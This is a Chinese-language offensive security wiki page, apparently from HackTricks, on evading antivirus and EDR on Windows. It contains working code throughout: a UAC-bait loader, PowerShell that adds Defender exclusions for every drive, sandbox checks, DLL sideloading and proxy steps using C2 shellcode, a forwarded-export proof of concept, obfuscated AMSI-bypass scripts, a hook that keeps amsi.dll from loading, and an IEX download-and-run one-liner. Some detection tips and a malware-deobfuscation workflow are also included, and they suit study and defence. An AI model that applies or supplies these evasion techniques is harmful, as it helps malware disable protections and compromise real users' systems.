# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**此页面最初由** [**@m2rc_p**](https://twitter.com/m2rc_p)** 编写！**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot)：用于停止 Windows Defender 工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender)：通过伪装成另一个 AV 来停止 Windows Defender 工作的工具。
- [如果你是 admin，则禁用 Defender](basic-powershell-for-pentesters/README.md)

### 在篡改 Defender 之前使用 Installer-style UAC bait

伪装成游戏 cheats 的 Public loaders 通常以未签名的 Node.js/Nexe installers 形式分发，先**请求用户提升权限**，然后才削弱 Defender。流程很简单：

1. 使用 `net session` 检查 administrative context。只有调用者拥有 admin 权限时，该命令才会成功，因此失败表示 loader 以 standard user 身份运行。
2. 立即使用 `RunAs` verb 重新启动自身，在保留原始 command line 的同时触发预期的 UAC consent prompt。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
受害者本来就相信自己正在安装“cracked”软件，因此通常会接受该提示，从而授予 malware 修改 Defender policy 所需的权限。<sup>[[26]](#references)</sup>

### 为每个驱动器号设置全面的 `MpPreference` exclusions

获得提升的权限后，GachiLoader-style chains 不会直接禁用服务，而是尽可能扩大 Defender 的盲区。loader 首先终止 GUI watchdog（`taskkill /F /IM SecHealthUI.exe`），然后推送**极其宽泛的 exclusions**，使每个用户配置文件、系统目录和可移动磁盘都无法被扫描：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
关键观察：

- 该循环会遍历每个已挂载的文件系统（D:\、E:\、USB 盘等），因此**之后丢弃到磁盘任意位置的 payload 都会被忽略**。
- 排除 `.sys` 扩展名是面向未来的设计——攻击者之后可以保留加载 unsigned drivers 的选项，而无需再次触碰 Defender。
- 所有更改都位于 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 下，使后续阶段能够确认排除项是否持久存在，或在不再次触发 UAC 的情况下扩展排除范围。

由于没有停止 Defender 服务，简单的健康检查仍会报告“antivirus active”，即使实时检查实际上从未触及这些路径。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

目前，AV 使用不同方法检查文件是否为恶意文件，包括 static detection、dynamic analysis，以及更高级 EDR 所使用的 behavioural analysis。

### **Static detection**

Static detection 通过标记 binary 或 script 中已知的恶意字符串或字节数组来实现，同时也会从文件本身提取信息（例如文件描述、公司名称、digital signatures、图标、checksum 等）。这意味着使用已知的 public tools 可能更容易被发现，因为它们很可能已经被分析并标记为恶意。以下是几种绕过此类检测的方法：

- **Encryption**

如果对 binary 进行加密，AV 将无法检测你的程序，但你需要某种 loader 在内存中解密并运行该程序。

- **Obfuscation**

有时只需更改 binary 或 script 中的一些字符串，就能使其通过 AV 检测，但根据你要进行 obfuscation 的内容，这可能会耗费大量时间。

- **Custom tooling**

如果你开发自己的 tools，就不会存在已知的 bad signatures，但这需要投入大量时间和精力。

> [!TIP]
> 检查 Windows Defender static detection 的一个好方法是使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上会将文件拆分成多个 segment，然后让 Defender 分别扫描每个 segment，这样就能准确告诉你 binary 中哪些字符串或字节被标记。

我强烈建议你查看这个关于实际 AV Evasion 的 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **Dynamic analysis**

Dynamic analysis 是指 AV 在 sandbox 中运行你的 binary，并监视恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这部分处理起来可能更棘手，但你可以采取以下措施来规避 sandbox。

- **Sleep before execution** 根据实现方式，这可能是绕过 AV dynamic analysis 的好方法。AV 扫描文件的时间非常短，以免中断用户工作流程，因此使用较长的 sleep 可能会干扰 binary 的分析。问题在于，许多 AV sandbox 可以根据实现方式直接跳过 sleep。
- **Checking machine's resources** 通常，Sandbox 可使用的资源很少（例如 < 2GB RAM），否则可能拖慢用户的机器。你也可以在这里发挥创意，例如检查 CPU 温度甚至风扇转速，因为并非所有功能都会在 sandbox 中实现。
- **Machine-specific checks** 如果你想针对工作站加入 `"contoso.local"` domain 的用户，可以检查计算机的 domain 是否与你指定的 domain 匹配；如果不匹配，就可以让程序退出。

事实证明，Microsoft Defender 的 Sandbox computername 是 HAL9TH。因此，你可以在 malware detonation 前检查 computer name；如果名称匹配 HAL9TH，就意味着你位于 Defender 的 sandbox 中，此时可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源：<a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) 还提供了一些针对 Sandbox 的非常实用的建议。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

正如我们在本文前面所说，**public tools** 最终都会**被检测到**，因此你应该问自己一个问题：

例如，如果你想 dump LSASS，**真的需要使用 mimikatz 吗**？还是可以使用另一个知名度较低、同样能够 dump LSASS 的 project？

正确答案可能是后者。以 mimikatz 为例，它可能是 AV 和 EDR 标记最多的 malware 之一。虽然该 project 本身非常优秀，但要使用它绕过 AV 也十分棘手，因此只需针对你的目标寻找替代方案即可。

> [!TIP]
> 修改 payload 以进行 evasion 时，请确保在 Defender 中**关闭 automatic sample submission**；并且请认真注意，如果你的目标是长期实现 evasion，**请勿上传到 VIRUSTOTAL**。如果你想检查 payload 是否会被某个特定 AV 检测到，请在 VM 上安装该 AV，尝试关闭 automatic sample submission，然后在那里进行测试，直到你对结果满意为止。

## EXEs vs DLLs

只要条件允许，始终**优先使用 DLL 进行 evasion**。根据我的经验，DLL 文件通常**更不容易被检测和分析**，因此在某些情况下，这是避免检测的一个非常简单的技巧（当然，前提是你的 payload 能够以 DLL 的形式运行）。

如图所示，Havoc 的 DLL Payload 在 antiscan.me 上的 detection rate 为 4/26，而 EXE payload 的 detection rate 为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 对比普通 Havoc EXE payload 与普通 Havoc DLL</p></figcaption></figure>

下面我们将介绍一些可以用于 DLL 文件的技巧，使其更加 stealthier。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 使用的 DLL search order，将 victim application 与 malicious payload(s) 并列放置。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 以及以下 powershell script 检查容易受到 DLL Sideloading 影响的程序：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令将输出位于 "C:\Program Files\\" 内易受 DLL hijacking 影响的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你**自行探索 DLL Hijackable/Sideloadable programs**。如果正确实施，这项技术相当隐蔽；但如果你使用公开已知的 DLL Sideloadable programs，可能很容易被发现。

仅仅放置一个名称与程序预期加载的 DLL 相同的恶意 DLL，并不会加载你的 payload，因为程序期望该 DLL 中包含某些特定函数。为了解决这个问题，我们将使用另一种称为 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 会将程序发出的调用从 proxy（恶意）DLL 转发到原始 DLL，从而保留程序的功能，同时能够处理你的 payload 执行。

我将使用 [@flangvik](https://twitter.com/Flangvik) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我执行的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一条命令将为我们提供 2 个文件：一个 DLL 源代码模板，以及重命名后的原始 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
这些是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的 Detection rate 都是 0/26！我认为这算是成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈建议**你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 中关于 DLL Sideloading 的内容，以及 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)，以进一步深入了解我们讨论的内容。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE 模块可以导出实际上是“forwarders”的函数：导出条目不指向代码，而是包含一个形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows loader 将：

- 如果 `TargetDll` 尚未加载，则加载它
- 从其中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，则会从受保护的 KnownDLLs 命名空间提供它（例如 ntdll、kernelbase、ole32）。<sup>[[15]](#references)</sup>
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL 搜索顺序，其中包括执行 forward resolution 的模块所在目录。

这启用了一个间接 sideloading 原语：找到一个将函数 forward 到非 KnownDLL 模块名称的签名 DLL，然后将该签名 DLL 与一个由攻击者控制、且名称与 forwarded target module 完全相同的 DLL 放在同一目录中。当调用 forwarded export 时，loader 会解析该 forward，并从同一目录加载你的 DLL，执行你的 DllMain。<sup>[[13]](#references)</sup>

Windows 11 上观察到的示例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此会通过常规搜索顺序解析。

PoC（复制粘贴）：
1) 将已签名的系统 DLL 复制到可写目录
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放置一个恶意的 `NCRYPTPROV.dll`。只需一个最小化的 DllMain 即可执行代码；无需实现转发的函数即可触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
观察到的行为：
- rundll32（signed）加载 side-by-side `keyiso.dll`（signed）
- 在解析 `KeyIsoSetAuditingInterface` 时，loader 遵循转发至 `NCRYPTPROV.SetAuditingInterface`
- 随后 loader 从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果未实现 `SetAuditingInterface`，只有在 `DllMain` 已经运行后才会收到“missing API”错误

Hunting tips：
- 重点关注转发的 exports，其中目标模块不是 KnownDLL。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用以下工具枚举转发的 exports：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder inventory 以搜索候选项：https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

检测/防御思路：
- 监控 LOLBins（例如 `rundll32.exe`）从非系统路径加载已签名 DLL，随后从该目录加载具有相同基本名称的非 KnownDLLs
- 对如下进程/模块链发出警报：`rundll32.exe` → 非系统路径中的 `keyiso.dll` → 用户可写路径下的 `NCRYPTPROV.dll`
- 强制实施代码完整性策略（WDAC/AppLocker），并禁止应用程序目录中的写入+执行权限

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个 payload toolkit，利用挂起进程、direct syscalls 和 alternative execution methods 来绕过 EDR`

你可以使用 Freeze 以隐蔽方式加载并执行 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion 只是猫鼠游戏，今天有效的方法明天可能就会被检测到，因此不要只依赖单个工具；如果可能，尝试串联多种 Evasion 技术。

## Direct/Indirect Syscalls & SSN 解析 (SysWhispers4)

EDR 通常会在 `ntdll.dll` 的 syscall stub 上设置 **user-mode inline hooks**。为了绕过这些 hooks，你可以生成 **direct** 或 **indirect syscall stubs**，加载正确的 **SSN**（System Service Number），并在不执行被 hook 的 export entrypoint 的情况下转换到 kernel mode。<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**：在生成的 stub 中发出 `syscall`/`sysenter`/`SVC #0` 指令（不会命中 `ntdll` export）。
- **Indirect**：跳转到 `ntdll` 内现有的 `syscall` gadget，使 kernel transition 看起来源自 `ntdll`（有助于规避 heuristic detection）；**randomized indirect** 会在每次调用时从 gadget pool 中选择一个 gadget。
- **Egg-hunt**：避免在磁盘上嵌入静态的 `0F 05` opcode sequence；在 runtime 解析 syscall sequence。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**：通过按 virtual address 对 syscall stubs 排序来推断 SSN，而不是读取 stub bytes。
- **SyscallsFromDisk**：映射一个干净的 `\KnownDlls\ntdll.dll`，从其 `.text` 中读取 SSN，然后解除映射（绕过所有 in-memory hooks）。
- **RecycledGate**：将基于 VA 排序的 SSN 推断与 opcode validation 结合；当 stub 干净时使用 opcode validation，被 hook 时则回退到 VA inference。
- **HW Breakpoint**：在 `syscall` 指令上设置 DR0，并使用 VEH 在 runtime 从 `EAX` 捕获 SSN，无需解析被 hook 的 bytes。

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI 的创建目的是防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"。最初，AV 只能扫描**磁盘上的文件**，因此，如果你能以某种方式将 payload **直接执行在内存中**，AV 就无法阻止它，因为 AV 无法获得足够的可见性。

AMSI 功能集成在以下 Windows 组件中。

- User Account Control，或 UAC（EXE、COM、MSI 或 ActiveX 安装的提权）
- PowerShell（脚本、交互式使用和动态代码评估）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA 宏

它允许 antivirus solutions 通过以未加密且未混淆的形式暴露脚本内容，来检查脚本行为。

在 Windows Defender 上运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会产生以下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意，它会添加 `amsi:` 前缀，随后是运行脚本的可执行文件路径，在本例中是 powershell.exe。

我们没有向磁盘写入任何文件，但仍然因为 AMSI 在内存中被捕获。

此外，从 **.NET 4.8** 开始，C# 代码也会经过 AMSI。这甚至会影响使用 `Assembly.Load(byte[])` 加载内存中的执行内容。因此，如果你想绕过 AMSI，建议在内存中执行时使用较低版本的 .NET（如 4.7.2 或更低版本）。

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此，修改你尝试加载的脚本可能是规避检测的有效方法。

但是，即使脚本包含多层混淆，AMSI 也能够对其进行反混淆，因此，具体取决于实现方式，混淆可能并不是一个好选择。这使得规避检测并不那么直接。不过，有时你只需要修改几个变量名就足够了，因此这取决于某段内容被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将 DLL 加载到 powershell（以及 cscript.exe、wscript.exe 等）进程中实现的，即使以非特权用户身份运行，也可以轻松篡改它。由于 AMSI 实现中存在这一缺陷，研究人员已经发现了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）会导致当前进程不启动扫描。最初由 [Matt Graeber](https://twitter.com/mattifestation) 披露，之后 Microsoft 开发了一个 signature，以防止其被广泛使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 PowerShell code，就能让当前 PowerShell 进程中的 AMSI 失效。当然，这一行 code 本身已经被 AMSI 标记，因此需要进行一些修改才能使用此 technique。

以下是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中获取的修改版 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请注意，这篇文章发布后很可能会被标记，因此如果你的计划是保持 undetected，就不应发布任何代码。

**Memory Patching**

此技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，其原理是查找 amsi.dll 中的 "AmsiScanBuffer" 函数地址（负责扫描用户提供的输入），并将其覆盖为返回 E_INVALIDARG 代码的指令。这样，实际扫描的结果将返回 0，该结果会被解释为干净结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获取更详细的说明。

还有许多其他用于通过 powershell bypass AMSI 的技术，请查看[**此页面**](basic-powershell-for-pentesters/index.html#amsi-bypass)和[**此 repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)，以进一步了解这些技术。

### 通过阻止 amsi.dll 加载来阻断 AMSI（LdrLoadDll hook）

只有在 `amsi.dll` 被加载到当前进程后，AMSI 才会初始化。一种健壮且与语言无关的 bypass 方法是对 `ntdll!LdrLoadDll` 设置 user-mode hook；当请求的模块为 `amsi.dll` 时，该 hook 返回错误。因此，AMSI 永远不会加载，并且该进程不会执行任何扫描。<sup>[[23]](#references)</sup>

实现概要（x64 C/C++ 伪代码）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
说明
- 可用于 PowerShell、WScript/CScript 和自定义 loader（即其他情况下会加载 AMSI 的任何组件）。
- 配合通过 stdin 提供脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`），以避免产生过长的命令行痕迹。
- 已发现该方法被通过 LOLBins 执行的 loader 使用（例如由 `regsvr32` 调用 `DllRegisterServer`）。

工具 **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 也可以生成用于绕过 AMSI 的脚本。
工具 **[https://amsibypass.com/](https://amsibypass.com/)** 也可以生成用于绕过 AMSI 的脚本，通过随机化用户定义的函数、变量和字符表达式，并对 PowerShell 关键字应用随机大小写来避免 signature。

**移除检测到的 signature**

你可以使用 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 等工具，从当前进程的内存中移除检测到的 AMSI signature。该工具通过扫描当前进程内存中的 AMSI signature，然后使用 NOP 指令覆盖它，从而有效地将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 中找到使用 AMSI 的 AV/EDR 产品列表。

**使用 PowerShell 版本 2**
如果使用 PowerShell 版本 2，AMSI 将不会被加载，因此你可以运行脚本而不会被 AMSI 扫描。你可以这样做：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一项用于记录系统上执行的所有 PowerShell 命令的功能。这对于审计和故障排除很有用，但也可能给**希望规避检测的攻击者带来问题**。

要绕过 PowerShell logging，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**：可以使用 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 等工具。
- **Use Powershell version 2**：如果使用 PowerShell version 2，AMSI 将不会被加载，因此可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **Use an unmanaged PowerShell session**：使用 [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 在不启动 `powershell.exe` 的情况下托管 PowerShell（Cobalt Strike 的 `powerpick` 所采用的方法）。这可以规避专门绑定到 `powershell.exe` 进程的控制，但并不会自动禁用 AMSI、Script Block Logging 或其他所有 PowerShell 防御；具体覆盖范围取决于 runtime 和 host implementation。


## Obfuscation

> [!TIP]
> 多种 obfuscation 技术依赖于加密数据，这会增加 binary 的 entropy，从而使 AV 和 EDR 更容易检测到它。对此要保持谨慎，并且可以只对代码中敏感或需要隐藏的特定部分应用加密。

### Deobfuscating ConfuserEx-Protected .NET Binaries

分析使用 ConfuserEx 2（或 commercial forks）的 malware 时，经常会遇到多层保护，这些保护会阻止 decompilers 和 sandboxes。下面的 workflow 可以可靠地**恢复接近原始状态的 IL**，之后即可使用 dnSpy 或 ILSpy 等工具将其 decompile 为 C#。<sup>[[10]](#references)</sup>

1. 反 tampering 移除 – ConfuserEx 会加密每个 *method body*，并在 *module* static constructor（`<Module>.cctor`）中解密。它还会修改 PE checksum，因此任何改动都会导致 binary 崩溃。使用 **AntiTamperKiller** 定位加密的 metadata tables，恢复 XOR keys 并重写干净的 assembly：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个 anti-tamper parameters（`key0-key3`、`nameHash`、`internKey`），在构建自己的 unpacker 时可能很有用。

2. Symbol / control-flow recovery – 将 *clean* file 提供给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot fork）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags：
• `-p crx` – 选择 ConfuserEx 2 profile  
• de4dot 将撤销 control-flow flattening，恢复原始 namespaces、classes 和 variable names，并解密 constant strings。

3. Proxy-call stripping – ConfuserEx 会使用轻量级 wrappers（也称为 *proxy calls*）替换 direct method calls，以进一步破坏 decompilation。使用 **ProxyCall-Remover** 将其移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，应能看到正常的 .NET API，例如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的 wrapper functions（`Class8.smethod_10`、……）。

4. Manual clean-up – 在 dnSpy 中运行生成的 binary，搜索较大的 Base64 blobs 或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用位置，以定位 *real* payload。malware 通常会将其存储为 TLV-encoded byte array，并在 `<Module>.byte_0` 中进行初始化。

上述 chain 无需运行 malicious sample 即可恢复 execution flow——这对于在 offline workstation 上进行分析非常有用。

> 🛈  ConfuserEx 会生成名为 `ConfusedByAttribute` 的 custom attribute，可将其用作 IOC，以便自动 triage samples。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator)：该项目旨在提供一个 [LLVM](http://www.llvm.org/) 编译套件的开源 fork，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改功能提升软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator)：ADVobfuscator 演示了如何使用 `C++11/14` 语言在编译时生成 obfuscated code，无需任何外部工具，也无需修改 compiler。
- [**obfy**](https://github.com/fritzone/obfy)：添加一层由 C++ template metaprogramming framework 生成的 obfuscated operations，使试图破解应用程序的人更加困难。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**：**Alcatraz 是一个 x64 binary obfuscator，能够对各种 PE 文件进行 obfuscate，包括：.exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame)：Metame 是一个用于任意 executables 的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator)：ROPfuscator 是一个面向 LLVM-supported languages 的细粒度 code obfuscation framework，使用 ROP（return-oriented programming）。ROPfuscator 在 assembly code 层面通过将常规 instructions 转换为 ROP chains 来 obfuscate 程序，从而破坏我们对正常 control flow 的自然认知。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt)：Nimcrypt 是一个使用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**：**Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后加载它们

### LLVM compiler-assisted per-function self-masking

与仅在 implant 休眠期间对整个 implant 进行 masking 不同，修改后的 LLVM X86 backend 可以在选定函数处于非活动状态时持续对其进行 XOR-masking。Function Peekaboo PoC 会选择包含 `REG_` 的 demangled names，在最终 machine code 周围注入 position-independent entry/exit stubs，并在 `.text` 中生成一个共享的 masking handler；source-level signatures 和 Windows x64 calling convention 保持不变。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

该操作应在 instruction selection 和 optimization 之后进行，因为 transformation 必须覆盖**每个生成的 return**，并且需要知道确切的 x86 layout。一个 pre-emission `MachineFunctionPass` 会找到最后一个 `MachineInstr::isReturn()`，删除它，使最终路径落入追加的 epilogue，并将更早的 returns 替换为 `JMP_1 handler`。保留每个 return 之前由 compiler 生成的 stack/frame teardown；只 redirect return instruction 本身。<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` 和 `X86AsmPrinter::emitFunctionBodyEnd()` 会生成每个函数的 stubs，而 `emitEndOfAsmFile()` 会生成 handler。不同 emission stages 之间共享的 symbols 使 prologue branch 能够指向之后的 epilogue；对于手动生成的 near `je`，写入 `0F 84`，后跟四字节 MC expression `target - address_after_je`。对 handler 的 calls 和 jumps 也可以作为 `MCInst` objects（`CALL64pcrel32` 和 `JMP_1`）生成。当 pass 没有修改未选中的 function 时，必须返回 `false`；PoC 在该路径上错误地返回了 `true`。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC 在 `.funcmeta` 中放置一个 XOR key，以及包含 loader-relocated function pointer 和 runtime length 的 16-byte records。虽然 C field 是 `uint32_t`，但 handler 会访问 record offset `+8` 处的 QWORD，同时读取 length 及其 padding，并按 `0x10` 步长推进 records。PE section names 只有八个字节，因此 runtime lookup 看到的是 `.funcmet`。外部 patcher 会添加一个 executable `.stub`，将旧的 entry-point RVA 保存到 stub 中，并 redirect `AddressOfEntryPoint`；PIC stub 从 `gs:[0x60]` → `[PEB+0x10]` 获取 image base，遍历 PE32+ imports 以解析已经 imported 的 `VirtualProtect`，并在 CRT 之前运行。<sup>[[38]](#references)[[39]](#references)</sup>

